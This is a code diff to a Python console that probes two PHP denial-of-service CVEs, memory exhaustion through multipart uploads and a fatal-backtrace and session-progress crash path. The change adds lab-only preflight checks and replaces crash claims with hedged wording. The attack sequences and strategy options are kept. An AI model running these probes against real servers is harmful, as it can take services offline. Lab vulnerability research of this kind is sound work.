@@ -5,6 +5,7 @@ import json
 import shlex
 import sys
 import time
+from http.cookies import CookieError, SimpleCookie
 from pathlib import Path
 
 try:
@@ -44,6 +45,25 @@ def human_size(n):
     return f"{n:.1f} TiB"
 
 
+def has_oom_marker(body):
+    """Recognize an explicit PHP memory-exhaustion response, not any fatal error."""
+    body = str(body).lower()
+    return "allowed memory size" in body and "exhausted" in body
+
+
+def parse_lab_json(result):
+    """Return an expected lab health document or a reason to stop the probe."""
+    if result.get("http_status") != 200:
+        return None, "health endpoint did not return HTTP 200"
+    try:
+        data = json.loads(result.get("body_prefix", ""))
+    except (json.JSONDecodeError, TypeError, ValueError):
+        return None, "health endpoint did not return valid JSON"
+    if not isinstance(data, dict) or data.get("lab") != "official-cve-lab-v1":
+        return None, "health endpoint is not the expected lab"
+    return data, None
+
+
 BANNER = r"""
   ____  _   _ ____                _ ____       ____
  |  _ \| | | |  _ \      _   _ _(_)  _ \  ___/ ___|
@@ -55,8 +75,8 @@ BANNER = r"""
 
   target <url>        Set target (e.g. target 192.168.1.10:8088)
   health              Health check
-  109618 [strategy]   OOM attack (part-headers|empty-files|form-value)
-  109619              Cross-request crash (fatal-backtrace)
+  109618 [strategy]   OOM candidate (part-headers|empty-files|form-value)
+  109619              Fatal-backtrace candidate (PHP 8.5)
   session             Session lifecycle probe (A->B full sequence)
   set                 Show settable parameters
   show                Show current config
@@ -68,10 +88,10 @@ Commands:
   target <url>                Set target URL (e.g. http://192.168.1.10:8088)
   show                        Show current settings
   health                      Send health check to target
-  109618 [strategy]           Execute CVE-2026-109618 OOM attack
+  109618 [strategy]           Observe CVE-2026-109618 OOM candidate
                               Strategies: part-headers, empty-files, form-value, files-registration
-  109619                      Execute CVE-2026-109619 cross-request crash (fatal-backtrace)
-  session                     Execute CVE-2026-109619 session lifecycle probe
+  109619                      Probe CVE-2026-109619 fatal-backtrace path (PHP 8.5)
+  session                     Probe the CVE-2026-109619 Session lifecycle path
   set <key> <value>           Set parameter (see 'set' for list)
   help                        Show this help
   exit / quit                 Exit
@@ -82,7 +102,7 @@ Settable parameters (auto-scaled on first health check):
   health <path>               Health endpoint (default: health.php)
   upload <path>               Upload endpoint (default: upload.php)
   producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
-  consumer <path>             Early consumer endpoint (default: health.php)
+  consumer <path>             Explicit early consumer endpoint (must configure for 109619)
   seed <path>                 Session seed endpoint (default: session/session-seed.php)
   session-health <path>       Session health endpoint (default: session/health.php)
   session-upload <path>       Session upload endpoint (default: session/upload.php)
@@ -116,6 +136,7 @@ class Console:
         self.field_name_kib = 700
         self.timeout = 60.0
         self.expected_php = "8.5.11"
+        self.consumer_explicit = False
 
     def path(self, name):
         return endpoint_path(self.prefix, self.endpoints[name])
@@ -213,6 +234,8 @@ class Console:
             url = "http://" + url
         self.scheme, self.host, self.port, self.prefix = parse_target(url)
         self.target = url
+        self.target_mem_limit = None
+        self.target_post_max = None
         print(f"\033[92mTarget set: {self.scheme}://{self.host}:{self.port}{self.prefix}\033[0m")
 
     def cmd_show(self):
@@ -265,10 +288,14 @@ class Console:
             print(f"Unknown strategy. Choose: {', '.join(strategies)}")
             return
 
-        print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
+        print(f"\033[93m[CVE-2026-109618] OOM candidate — {strategy}\033[0m")
         print("Step 1: Health check (baseline)...")
         baseline = send(self.scheme, self.host, self.port, "GET",
                         self.path("health"), self.timeout, None, "baseline")
+        _, preflight_error = parse_lab_json(baseline)
+        if preflight_error:
+            print(f"  Preflight stopped: {preflight_error}")
+            return
         pid_before = baseline.get("worker_pid_header", "?")
         print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
         if self.target_mem_limit is None:
@@ -285,8 +312,8 @@ class Console:
         else:
             print(f"  HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
             body_text = result.get("body_prefix", "")
-            if "Fatal error" in body_text or "Allowed memory" in body_text:
-                print(f"  \033[93mOOM triggered!\033[0m")
+            if has_oom_marker(body_text):
+                print(f"  \033[93mOOM response observed; CVE impact unconfirmed\033[0m")
             print(f"  Body: {body_text[:200]}")
 
         print("Step 3: Health check (after)...")
@@ -296,16 +323,50 @@ class Console:
         print(f"  PID: {pid_after}, HTTP {after.get('http_status', 'error')}")
 
         if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-            print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")
-        elif pid_before == pid_after:
-            print(f"  Worker survived (PID unchanged: {pid_before})")
+            print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
+        elif pid_before != "?" and pid_before == pid_after:
+            print(f"  Health endpoint answered from the same PID: {pid_before}")
+        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109618 DoS.")
 
     def cmd_109619(self):
         self.require_target()
-        print(f"\033[93m[CVE-2026-109619] Cross-request crash\033[0m")
+        if (not self.consumer_explicit
+                or self.path("consumer") == self.path("health")):
+            print("  Preflight stopped: configure an explicit early consumer endpoint "
+                  "with 'set consumer <path>'; health.php is not an early consumer.")
+            return
+        print(f"\033[93m[CVE-2026-109619] Fatal-backtrace candidate\033[0m")
         print("Step 1: Health check (baseline)...")
         baseline = send(self.scheme, self.host, self.port, "GET",
                         self.path("health"), self.timeout, None, "baseline")
+        health, preflight_error = parse_lab_json(baseline)
+        if preflight_error:
+            print(f"  Preflight stopped: {preflight_error}")
+            return
+        if not self.expected_php.startswith("8.5.") or health.get("php") != self.expected_php:
+            print(f"  Preflight stopped: PHP 8.5 exact version {self.expected_php} "
+                  f"required; observed {health.get('php')!r}")
+            return
+        if health.get("sapi") != "apache2handler":
+            print(f"  Preflight stopped: apache2handler required; "
+                  f"observed {health.get('sapi')!r}")
+            return
+        if str(health.get("fatal_error_backtraces")) != "1":
+            print("  Preflight stopped: fatal_error_backtraces is not enabled")
+            return
+        early_response = send(self.scheme, self.host, self.port, "GET",
+                              self.path("consumer"), self.timeout, None,
+                              "early-consumer-preflight")
+        early_health, preflight_error = parse_lab_json(early_response)
+        if preflight_error:
+            print(f"  Preflight stopped: early consumer {preflight_error}")
+            return
+        if (early_health.get("php") != self.expected_php or
+                early_health.get("sapi") != "apache2handler" or
+                str(early_health.get("auto_detect_line_endings", "")).lower()
+                not in ("1", "on")):
+            print("  Preflight stopped: early consumer PHP/SAPI or INI diagnostic setting mismatch")
+            return
         pid_before = baseline.get("worker_pid_header", "?")
         print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
 
@@ -314,20 +375,33 @@ class Console:
                         self.path("producer"), self.timeout, None, "fatal-producer")
         if "transport_error" in producer:
             print(f"  \033[91m{producer['transport_error']}\033[0m")
+            print("  Producer result is unconfirmed; consumer request skipped.")
+            return
         else:
-            print(f"  HTTP {producer['http_status']} ({producer['elapsed_ms']}ms)")
+            print(f"  HTTP {producer.get('http_status', 'unknown')} "
+                  f"({producer.get('elapsed_ms', '?')}ms)")
+            producer_status = producer.get("http_status")
+            if not isinstance(producer_status, int):
+                print("  Producer response is incomplete; consumer request skipped.")
+                return
+            if producer_status < 500 and "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
+                print("  No fatal producer response observed; consumer request skipped.")
+                return
+            if "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
+                print("  HTTP error observed; the producer cause is unconfirmed from HTTP alone.")
 
         print("Step 3: Early consumer...")
         consumer = send(self.scheme, self.host, self.port, "GET",
                         self.path("consumer"), self.timeout, None, "early-consumer")
         if "transport_error" in consumer:
             print(f"  \033[91m{consumer['transport_error']}\033[0m")
-            print(f"  \033[91mWorker likely crashed!\033[0m")
+            print("  Consumer transport error observed; worker status unconfirmed.")
         else:
             pid_after = consumer.get("worker_pid_header", "?")
             print(f"  PID: {pid_after}, HTTP {consumer['http_status']}")
             if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-                print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")
+                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
+        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")
 
     def cmd_session(self):
         self.require_target()
@@ -339,10 +413,34 @@ class Console:
         if "transport_error" in health:
             print(f"  \033[91m{health['transport_error']}\033[0m")
             return
+        health_data, preflight_error = parse_lab_json(health)
+        if preflight_error:
+            print(f"  Preflight stopped: {preflight_error}")
+            return
+        if health_data.get("php") != self.expected_php:
+            print(f"  Preflight stopped: expected PHP {self.expected_php}, "
+                  f"observed {health_data.get('php')!r}")
+            return
+        if health_data.get("sapi") != "apache2handler":
+            print(f"  Preflight stopped: apache2handler required; "
+                  f"observed {health_data.get('sapi')!r}")
+            return
+        if str(health_data.get("upload_progress")) != "1":
+            print("  Preflight stopped: session upload progress is not enabled")
+            return
+        try:
+            memory_limit = parse_php_size(health_data.get("memory_limit"))
+            post_max_size = parse_php_size(health_data.get("post_max_size"))
+            if memory_limit <= 0 or post_max_size <= 0:
+                raise ValueError("limits must be positive")
+        except (TypeError, ValueError):
+            print("  Preflight stopped: positive memory_limit and post_max_size are required")
+            return
         pid_before = health.get("worker_pid_header", "?")
         print(f"  PID: {pid_before}, HTTP {health.get('http_status')}")
-        if self.target_mem_limit is None:
-            self._detect_mem_limit(health.get("body_prefix", ""))
+        self.target_mem_limit = memory_limit
+        self.target_post_max = post_max_size
+        self._detect_mem_limit(health.get("body_prefix", ""))
 
         print("Step 2: Acquiring session cookie...")
         seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
@@ -350,10 +448,34 @@ class Console:
         if "transport_error" in seed:
             print(f"  \033[91m{seed['transport_error']}\033[0m")
             return
-        if not set_cookie:
-            print("  \033[91mNo session cookie received\033[0m")
+        if seed.get("http_status") != 200:
+            print("  Preflight stopped: session seed endpoint did not return HTTP 200")
             return
-        cookie = set_cookie.split(";")[0]
+        try:
+            seed_data = json.loads(seed.get("body_prefix", ""))
+        except (json.JSONDecodeError, TypeError, ValueError):
+            seed_data = None
+        if not isinstance(seed_data, dict) or seed_data.get("seeded") is not True:
+            print("  Preflight stopped: session seed was not confirmed")
+            return
+        required_settings = ("upload_progress_enabled", "upload_progress_cleanup",
+                             "use_only_cookies", "use_strict_mode")
+        if any(str(seed_data.get(name)) != "1" for name in required_settings):
+            print("  Preflight stopped: session seed settings do not match the lab profile")
+            return
+        session_name = seed_data.get("session_name")
+        cookie_jar = SimpleCookie()
+        try:
+            if set_cookie:
+                cookie_jar.load(set_cookie)
+        except CookieError:
+            pass
+        if (not isinstance(session_name, str) or not session_name
+                or session_name not in cookie_jar
+                or not cookie_jar[session_name].value):
+            print("  Preflight stopped: matching session cookie was not issued")
+            return
+        cookie = f"{session_name}={cookie_jar[session_name].value}"
         print(f"  Got session cookie")
 
         producer_body = multipart_producer(self.field_bytes, "candidate")
@@ -363,11 +485,15 @@ class Console:
                                       cookie=cookie, timeout=self.timeout)
         if "transport_error" in producer:
             print(f"  \033[91m{producer['transport_error']}\033[0m")
+            print("  Producer result is unconfirmed; consumer request skipped.")
+            return
         else:
             body_text = producer.get("body_prefix", "")
             print(f"  HTTP {producer.get('http_status')} ({producer.get('elapsed_ms')}ms)")
-            if "Fatal error" in body_text:
-                print(f"  \033[93mOOM triggered\033[0m")
+            if not has_oom_marker(body_text):
+                print("  No explicit OOM response observed; consumer request skipped.")
+                return
+            print(f"  \033[93mOOM response observed\033[0m")
 
         consumer_body = multipart_consumer()
         print("Step 4: Consumer (session progress callback on stale state)...")
@@ -376,14 +502,15 @@ class Console:
                                       cookie=cookie, timeout=self.timeout)
         if "transport_error" in consumer:
             print(f"  \033[91m{consumer['transport_error']}\033[0m")
-            print(f"  \033[91mWorker crashed! (connection reset)\033[0m")
+            print("  Consumer transport error observed; worker status unconfirmed.")
         else:
             pid_after = consumer.get("worker_pid_header", "?")
             print(f"  PID: {pid_after}, HTTP {consumer.get('http_status')}")
             if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-                print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")
-            elif pid_before == pid_after:
-                print(f"  Worker survived (PID unchanged)")
+                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
+            elif pid_before != "?" and pid_before == pid_after:
+                print(f"  Consumer answered from the baseline PID: {pid_before}")
+        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")
 
     def cmd_set(self, key=None, value=None, *_):
         if key is None:
@@ -394,6 +521,8 @@ class Console:
             return
         if key in self.endpoints:
             self.endpoints[key] = value
+            if key == "consumer":
+                self.consumer_explicit = True
             print(f"  {key} = {value}")
         elif key == "part-headers":
             self.part_headers = int(value)
